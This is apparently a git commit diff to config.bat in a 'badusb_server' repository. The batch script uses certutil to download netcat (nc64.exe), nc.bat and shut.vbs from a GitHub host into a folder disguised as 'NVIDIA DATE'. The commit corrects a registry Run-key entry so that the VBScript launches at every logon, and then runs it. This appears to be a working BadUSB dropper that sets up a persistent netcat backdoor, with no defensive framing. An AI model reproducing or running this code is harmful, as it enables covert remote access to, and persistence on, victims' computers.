acc199000c80e395945dcbe4ed6cf0f9bf8a43cb
KBT096 <45223710+KBT096@users.noreply.github.com>
2019-08-18 00:09:30 +0800

    Update config.bat

--- config.bat
+++ config.bat
@@ -2,6 +2,6 @@ cd "c:\ProgramData\NVIDIA DATE"
 certutil -urlcache -split -f https://raw.githubusercontent.com/KBT096/badusb_server/master/nc64.exe
 certutil -urlcache -split -f https://raw.githubusercontent.com/KBT096/badusb_server/master/nc.bat
 certutil -urlcache -split -f https://raw.githubusercontent.com/KBT096/badusb_server/master/shut.vbs
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "C:\ProgramData\NVIDIA DATE\shut.vbs" /d "c:\windows\system32\regedit" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "shut"  /t REG_SZ /d "c:\ProgramData\NVIDIA DATE\shut.vbs" /f
 "c:\ProgramData\NVIDIA DATE\shut.vbs"
  exit
